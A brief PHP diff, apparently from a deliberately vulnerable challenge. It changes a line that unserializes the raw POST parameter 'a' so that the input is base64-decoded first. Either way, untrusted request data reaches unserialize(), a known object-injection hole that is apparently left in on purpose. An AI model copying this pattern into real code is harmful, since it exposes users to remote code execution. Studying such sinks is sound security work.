@@ -31,6 +31,6 @@ class home{
         }
     }   
 }
-     $a=@$_POST['a'];
-    @unserialize($a);
+    $a=@$_POST['a'];
+    @unserialize(base64_decode($a));
     ?>
